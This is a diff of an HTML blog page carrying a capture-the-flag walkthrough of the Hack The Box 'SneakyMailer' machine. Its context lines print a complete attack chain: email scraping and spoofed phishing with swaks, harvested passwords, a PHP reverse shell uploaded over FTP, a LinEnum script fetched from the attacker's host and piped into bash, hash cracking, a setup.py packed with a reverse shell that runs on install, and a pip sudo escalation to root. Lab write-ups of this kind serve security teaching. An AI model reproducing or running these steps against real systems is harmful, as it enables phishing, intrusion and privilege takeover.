@@ -75,28 +75,28 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 <blockquote>
-<p>That`s a big scan result.</p>
-<p>At the end of the scan you can see the domain so we need to add it. add <code class="language-plaintext highlighter-rouge">sneakycorp.htb</code> to /etc/hosts file </p>
+That`s a big scan result.
+At the end of the scan you can see the domain so we need to add it. add <code class="language-plaintext highlighter-rouge">sneakycorp.htb</code> to /etc/hosts file 
 </blockquote>  
 
 <h1>Port 80</h1>
 <blockquote>  
-<p>Let`s see what we can find.</p>
+Let`s see what we can find.
 </blockquote>  
 <img src="https://i.ibb.co/xjXWFGz/3.png" alt="3" border="0">   
 <blockquote>
-<p>It`s a pypi server</p>
-<p>Let`s check team and see what we can find</p>
+It`s a pypi server
+Let`s check team and see what we can find
 </blockquote>  
 <img src="https://i.ibb.co/3BbXmVJ/4.png" alt="4" border="0">
 <blockquote>  
-<p>All e-mails of employees including <code class="language-plaintext highlighter-rouge">ceo</code> </p>
-<p>Now we need to extract e-mails for the webpage, I used online email extractor tool.</p> 
-<p><a href="https://email-checker.net/extract" target="_blank">https://email-checker.net/extract</a></p>
+All e-mails of employees including <code class="language-plaintext highlighter-rouge">ceo</code> 
+Now we need to extract e-mails for the webpage, I used online email extractor tool. 
+<a href="https://email-checker.net/extract" target="_blank">https://email-checker.net/extract</a>
 </blockquote> 
 
 <blockquote>
-<p>crtl+a to select all and copy them.</p>  
+crtl+a to select all and copy them.  
 </blockquote>  
 <img src="https://i.ibb.co/hZv0F0Z/5.png" alt="5" border="0">
 <blockquote>Paste them and click on extract email</blockquote>  
@@ -105,12 +105,12 @@ Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 <img src="https://i.ibb.co/RSBHtZX/7.png" alt="7" border="0">
   
 <blockquote>  
-<p>Now save it all in a fill name it <code class="language-plaintext highlighter-rouge">emails</code></p>
+Now save it all in a fill name it <code class="language-plaintext highlighter-rouge">emails</code>
 </blockquote>
 <h1>Phishing</h1>
 <blockquote>  
-<p>We need to sned spoofed emails to check what we can get, I used swaks</p>
-<p><a href="https://github.com/jetmore/swaks" target="_blank">https://github.com/jetmore/swaks</a></p>
+We need to sned spoofed emails to check what we can get, I used swaks
+<a href="https://github.com/jetmore/swaks" target="_blank">https://github.com/jetmore/swaks</a>
 </blockquote>  
 <pre>➜  sneakymailer swaks <span class="nt">--from</span> <span class="s2">"angelicaramos@sneakymailer.htb"</span> <span class="nt">--body</span> <span class="s2">"Test msg"</span> <span class="nt">--to</span> angelicaramos@sneakymailer.htb
 <span class="o">===</span> Trying sneakymailer.htb:25...
@@ -165,7 +165,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 </span>        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
 </pre>
 
-<blockquote><p>Result after running the script</p></blockquote>
+<blockquote>Result after running the script</blockquote>
 <pre>➜  sneakymailer python spoof-msg.py                                                    
 
 <span class="o">[</span>+]Sending email to airisatou@sneakymailer.htb
@@ -177,7 +177,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 <span class="o">[</span>+]Sending email to bradleygreer@sneakymailer.htb
 </pre>  
  
-<blockquote><p>The response on listener</p></blockquote>  
+<blockquote>The response on listener</blockquote>  
 <pre><span class="err">➜  m19o nc -nlvp 8080 
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::8080
@@ -196,17 +196,17 @@ Ncat: Connection from 10.10.10.197:48426.
 firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
 </pre>
   
-<blockquote><p>So we found user : paulbyrd and the password we need to decode it</p>
-<p>Result after decoding</p>
+<blockquote>So we found user : paulbyrd and the password we need to decode it
+Result after decoding
 </blockquote>
 <pre>firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 </pre>  
   
-<blockquote><p>So we Got</p>
-<p>mail: paulbyrd@sneakymailer.htb
+<blockquote>So we Got
+mail: paulbyrd@sneakymailer.htb
 user: paulbyrd
-password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht</p>
-<p>Now i need to install evolution and enter the creds for smpt server 10.10.10.197 and the mail we found </p>  
+password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+Now i need to install evolution and enter the creds for smpt server 10.10.10.197 and the mail we found   
 </blockquote>
 <h2>mail 1 :</h2>  
 <pre>发件人: Paul Byrd paulbyrd@sneakymailer.htb
@@ -268,7 +268,7 @@ drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
 226 Directory send OK.
 ftp&gt;
 </pre>
-<blockquote><p>let`s try to upload reverse shell and execute it </p></blockquote>
+<blockquote>let`s try to upload reverse shell and execute it </blockquote>
 <pre>ftp> put shell.php
 local: shell.php remote: shell.php
 200 PORT command successful. Consider using PASV.
@@ -276,12 +276,12 @@ local: shell.php remote: shell.php
 226 Transfer complete.
 5492 bytes sent in 0.00 secs (59.5179 MB/s)</pre>
 <blockquote>
-<p>i tried to execute it at http://sneakycorp.htb/shell.php but did work</p>  
-<p>so i checked if dev is subdomain</p></blockquote>
+i tried to execute it at http://sneakycorp.htb/shell.php but did work  
+so i checked if dev is subdomain</blockquote>
 <img src="https://i.ibb.co/MVDyJ30/sub.png" alt="sub" border="0">
   
-<blockquote><p>Lol, it is a subdomain that was easy. You can use a lot of tools to get subdomain and you can be lucky 😂</p>
-<p>let`s upload the shell and execute it from http://dev.sneakycorp.htb/shell.php </p>  
+<blockquote>Lol, it is a subdomain that was easy. You can use a lot of tools to get subdomain and you can be lucky 😂
+let`s upload the shell and execute it from http://dev.sneakycorp.htb/shell.php   
 </blockquote>
 <h2>Shell</h2>
 <pre>➜  m19o rlwrap nc -nlvp 1234 
@@ -297,8 +297,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 bash: cannot set terminal process group (715): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@sneakymailer:/$</pre>
-<blockquote><p>It worked and we got in as www-data</p>
-<p>let`s us SU to switch to developer user we found</p> 
+<blockquote>It worked and we got in as www-data
+let`s us SU to switch to developer user we found 
 </blockquote>
 <pre>
 www-data@sneakymailer:/$ su developer
@@ -307,12 +307,12 @@ Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
 developer@sneakymailer:/$
 </pre>
-<blockquote><p>i found 2 users</p></blockquote>  
+<blockquote>i found 2 users</blockquote>  
 <pre>developer@sneakymailer:/home$ ls
 ls
 low  vmail</pre>
   
-<blockquote><p>Can`t get the user hash so let`s try to enumerate by Linenum.sh/p></blockquote>
+<blockquote>Can`t get the user hash so let`s try to enumerate by Linenum.sh/p></blockquote>
 <pre>developer@sneakymailer:/tmp$ curl http://10.10.14.24:8080/LinEnum.sh | bash                                                                                                                                        
 curl http://10.10.14.24:8080/LinEnum.sh | bash                                                           
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                          
@@ -328,12 +328,12 @@ curl http://10.10.14.24:8080/LinEnum.sh | bash
 [-] Debug Info                                                                                           
 [+] Thorough tests = Disabled </pre>  
     
-<blockquote><p>we found password at .htpasswd</p></blockquote>  
+<blockquote>we found password at .htpasswd</blockquote>  
 <pre>[-] htpasswd found - could contain passwords:                                                            
 /var/www/pypi.sneakycorp.htb/.htpasswd                                                                   
 pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</pre> 
   
-<blockquote><p>Let`s crack it</p></blockquote>
+<blockquote>Let`s crack it</blockquote>
 <pre>➜  m19o john hash -w=/usr/share/wordlists/rockyou.txt
 Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
 Use the "--format=md5crypt-long" option to force loading these as that type instead
@@ -347,7 +347,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed</pre>
   
   
-<blockquote><p>Remember the mail we got for low user</p></blockquote>
+<blockquote>Remember the mail we got for low user</blockquote>
 <pre>Hello low
 
 
@@ -355,16 +355,16 @@ Your current task is to install, test and then erase every python module you
 find in our PyPI service, let me know if you have any inconvenience.</pre>
   
 <h1 id="building-the-package">Building the package</h1>
-<blockquote><p><a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank">https://pypi.org/project/pypiserver/#upload-with-setuptools</a></p></blockquote>
-<blockquote><p><a href="https://packaging.python.org/tutorials/packaging-projects/" target="_blank">https://packaging.python.org/tutorials/packaging-projects/</a></p></blockquote>
-<blockquote><p><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/" target="_blank">https://packaging.python.org/guides/distributing-packages-using-setuptools/</a></p></blockquote>
+<blockquote><a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank">https://pypi.org/project/pypiserver/#upload-with-setuptools</a></blockquote>
+<blockquote><a href="https://packaging.python.org/tutorials/packaging-projects/" target="_blank">https://packaging.python.org/tutorials/packaging-projects/</a></blockquote>
+<blockquote><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/" target="_blank">https://packaging.python.org/guides/distributing-packages-using-setuptools/</a></blockquote>
   
-<p>i have to make two files </p>
+i have to make two files 
 <ul><li>.pypirc</li><li>setup.py</li></ul>
   
-<p>The file <code class="language-plaintext highlighter-rouge">.pypirc</code>will give me authority and setup.py will be contain the package</p>
+The file <code class="language-plaintext highlighter-rouge">.pypirc</code>will give me authority and setup.py will be contain the package
   
-<blockquote><p>.pypirc</p></blockquote>
+<blockquote>.pypirc</blockquote>
 <pre>[distutils]
 index-servers = local
 
@@ -373,8 +373,8 @@ repository: http://pypi.sneakycorp.htb:8080
 username: pypi
 password: soufianeelhaoui</pre> 
 
-<blockquote><p>setup.py</p>
-<p>will contain the reverse shell</p>  
+<blockquote>setup.py
+will contain the reverse shell  
 </blockquote>  
   
 <pre><span class="kn">import</span> <span class="nn">setuptools</span>
@@ -399,10 +399,10 @@ password: soufianeelhaoui</pre>
 <span class="p">)</span>
 </pre>  
  
-<blockquote><p>id : 1000 belongs to user "Low" , the file will be executed twice</p></blockquote>
+<blockquote>id : 1000 belongs to user "Low" , the file will be executed twice</blockquote>
 <ul><li>Developer will run it</li><li>Low will run it too to test it </li></ul>
   
-<blockquote><p>So i want the shell as "low",let`s nc and upload the files to execute it</p></blockquote>
+<blockquote>So i want the shell as "low",let`s nc and upload the files to execute it</blockquote>
   
 <pre>developer@sneakymailer:/tmp<span class="nv">$ </span>wget <span class="nt">-r</span> <span class="nt">--no-parent</span> http://10.10.17.16:8080/pypi-pkg                                                                                                                                  
 &lt;get <span class="nt">-r</span> <span class="nt">--no-parent</span> http://10.10.17.16:8080/pypi-pkg                                                                                                                                                               
@@ -452,10 +452,10 @@ ls
 </pre>
  
 <h1>Executing the package</h1>  
-<blockquote><p>Setting the path to current dir</p></blockquote>
+<blockquote>Setting the path to current dir</blockquote>
 <pre>developer@sneakymailer:/tmp/10.10.17.16:8080/pypi-pkg<span class="nv">$ HOME</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
 </pre>  
-<blockquote><p>Running setup.py</p></blockquote>
+<blockquote>Running setup.py</blockquote>
 <pre>developer@sneakymailer:~<span class="nv">$ </span>python3 setup.py sdist register <span class="nt">-r</span> <span class="nb">local </span>upload <span class="nt">-r</span> <span class="nb">local</span>
 &lt;n3 setup.py sdist register <span class="nt">-r</span> <span class="nb">local </span>upload <span class="nt">-r</span> <span class="nb">local
 </span>running sdist
@@ -522,7 +522,7 @@ User low may run the following commands on sneakymailer:
     (root) NOPASSWD: /usr/bin/pip3</pre>  
  
   
-<blockquote><p>Go to<a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank">https://gtfobins.github.io/gtfobins/pip/</a>and search for pip</p></blockquote>  
+<blockquote>Go to<a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank">https://gtfobins.github.io/gtfobins/pip/</a>and search for pip</blockquote>  
 <pre><span class="n">TF</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">mktemp</span> <span class="o">-</span><span class="n">d</span><span class="p">)</span>
 <span class="n">echo</span> <span class="s">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')"</span> <span class="o">&gt;</span> <span class="err">$</span><span class="n">TF</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span>
 <span class="n">pip</span> <span class="n">install</span> <span class="err">$</span><span class="n">TF</span>
@@ -538,7 +538,7 @@ Processing /tmp/tmp.tQid5dJuNf
 root@sneakymailer:/tmp/pip-req-build-9k8kjhct# <span class="nb">whoami
 </span>root
 </pre>
-<p>And we are "ROOT"!.</p>  
+And we are "ROOT"!.  
 <pre>root@sneakymailer:~# <span class="nb">cat </span>root.txt
 11----------------------------ff
 root@sneakymailer:~#
